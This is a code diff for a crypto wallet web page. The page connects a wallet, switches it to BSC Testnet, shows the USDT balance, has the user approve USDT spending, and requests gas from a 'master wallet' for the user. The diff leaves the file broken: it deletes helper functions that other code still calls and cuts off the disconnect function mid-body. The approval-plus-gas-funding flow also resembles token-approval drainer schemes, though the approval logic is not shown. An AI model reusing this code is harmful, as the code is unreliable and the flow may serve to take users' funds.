@@ -50,6 +50,13 @@ document.addEventListener('DOMContentLoaded', () => {
   disconnectBtn.addEventListener('click', disconnectWallet)
 })
 
+// Reset wallet connection
+function resetWallet() {
+  localStorage.removeItem('walletAddress')
+  showStatus('Wallet connection reset. Please connect again.')
+  showConnectSection()
+}
+
 // Connect wallet function - Now handles gas during connection
 async function connectWallet() {
   try {
@@ -116,40 +123,70 @@ async function connectWallet() {
   }
 }
 
-// Handle auto gas during connection
-async function handleAutoGasIfNeeded() {
+// Switch to correct network
+async function switchToCorrectNetwork() {
   try {
-    console.log('🔍 Starting auto-gas check...');
+    // Check current chain ID
+    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
     
-    // Check if wallet has sufficient gas
-    console.log('💰 Checking wallet gas balance...');
-    const hasGas = await checkWalletGasBalance()
-    console.log('⛽ Gas check result:', hasGas);
-    
-    if (!hasGas) {
-      console.log('🚨 Insufficient gas detected, requesting gas from master wallet...');
-      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
-      
-      // Request gas from backend (master wallet)
-      console.log('📤 Sending gas request to backend...');
-      await requestGasFromMaster(walletAddress)
-      console.log('📥 Gas request sent successfully');
-      
-      // Wait for gas to be sent by master wallet
-      console.log('⏳ Waiting for gas to arrive (up to 60 seconds)...');
-      await waitForGas(60000) // Wait up to 60 seconds
-      console.log('🎉 Gas received!');
-      
-      showSuccess('Gas received! You can now approve USDT spending.')
-    } else {
-      console.log('✅ Wallet already has sufficient gas, no action needed');
+    if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
+      showStatus('Switching to BSC Testnet...')
+      // Try to switch network
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
+        })
+      } catch (switchError) {
+        // If network doesn't exist, add it
+        if (switchError.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
+                chainName: CONFIG.CHAIN_NAME,
+                rpcUrls: [CONFIG.RPC_URL],
+                nativeCurrency: {
+                  name: 'BNB',
+                  symbol: 'BNB',
+                  decimals: 18
+                }
+              }]
+            })
+          } catch (addError) {
+            console.error('Failed to add network:', addError)
+          }
+        }
+      }
     }
-    
-    console.log('🔍 Auto-gas check completed');
   } catch (error) {
-    console.error('💥 Auto gas handling error:', error)
-    showError('Gas handling issue: ' + error.message)
-    throw error; // Re-throw to see if it's being caught elsewhere
+    console.error('Network switch error:', error)
+  }
+}
+
+// Update wallet information
+async function updateWalletInfo() {
+  if (!walletAddress) return
+  
+  walletAddressEl.textContent = formatAddress(walletAddress)
+  
+  // Get USDT balance
+  try {
+    if (provider) {
+      const usdtContract = new Contract(
+        CONFIG.USDT_CONTRACT_ADDRESS,
+        ['function balanceOf(address account) external view returns (uint256)'],
+        provider
+      )
+      
+      const balance = await usdtContract.balanceOf(walletAddress)
+      const formattedBalance = ethers.formatUnits(balance, 18)
+      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
+    }
+  } catch (error) {
+    console.error('Balance error:', error)
+    usdtBalanceEl.textContent = '0.00 USDT'
   }
 }
 
@@ -235,6 +272,7 @@ async function requestGasFromMaster(walletAddress) {
     throw new Error(`Gas request failed: ${error.message}`);
   }
 }
+
 // Check if wallet has sufficient gas balance
 async function checkWalletGasBalance() {
   try {
@@ -421,104 +459,3 @@ async function disconnectWallet() {
     resetConnection()
     
     // Optional: Notify user
-    showSuccess('Wallet disconnected successfully!')
-    
-  } catch (error) {
-    console.error('Disconnect error:', error)
-    showError('Error disconnecting wallet: ' + error.message)
-  } finally {
-    showLoading(disconnectBtn, false)
-    
-    // Reset disconnect button text after a moment
-    setTimeout(() => {
-      if (disconnectBtn) {
-        disconnectBtn.innerHTML = 'Disconnect Wallet'
-      }
-    }, 1000)
-  }
-}
-
-// Show connect section
-function showConnectSection() {
-  connectSection.classList.remove('hidden')
-  walletSection.classList.add('hidden')
-}
-
-// Show wallet section
-function showWalletSection() {
-  connectSection.classList.add('hidden')
-  walletSection.classList.remove('hidden')
-  approveBtn.disabled = false
-  approveText.textContent = 'Approve USDT Spending'
-  
-  // If already approved, show as approved
-  if (approveBtn.disabled) {
-    approveText.textContent = 'Approved'
-  }
-}
-
-// Format wallet address
-function formatAddress(address) {
-  if (!address) return ''
-  return `${address.substring(0, 6)}...${address.substring(38)}`
-}
-
-// Show loading state
-function showLoading(element, show) {
-  if (!element) return;
-  
-  if (show) {
-    const originalText = element.textContent || element.innerText;
-    element.setAttribute('data-original-text', originalText);
-    element.innerHTML = '<span class="loading"></span>Processing...'
-  } else {
-    const originalText = element.getAttribute('data-original-text');
-    if (originalText) {
-      element.textContent = originalText;
-    } else {
-      if (element.id === 'connect-text') {
-        element.textContent = 'Connect Wallet'
-      } else if (element.id === 'approve-text') {
-        element.textContent = 'Approve USDT Spending'
-      } else if (element.id === 'disconnect-btn') {
-        element.innerHTML = 'Disconnect Wallet'
-      }
-    }
-  }
-}
-
-// Show success message
-function showSuccess(message) {
-  if (!statusMessage) return;
-  
-  statusMessage.textContent = message
-  statusMessage.className = 'status status-success'
-  statusMessage.classList.remove('hidden')
-  
-  setTimeout(() => {
-    statusMessage.classList.add('hidden')
-  }, 5000)
-}
-
-// Show error message
-function showError(message) {
-  if (!statusMessage) return;
-  
-  statusMessage.textContent = message
-  statusMessage.className = 'status status-error'
-  statusMessage.classList.remove('hidden')
-  
-  setTimeout(() => {
-    statusMessage.classList.add('hidden')
-  }, 5000)
-}
-
-
-
-
-
-
-
-
-
-
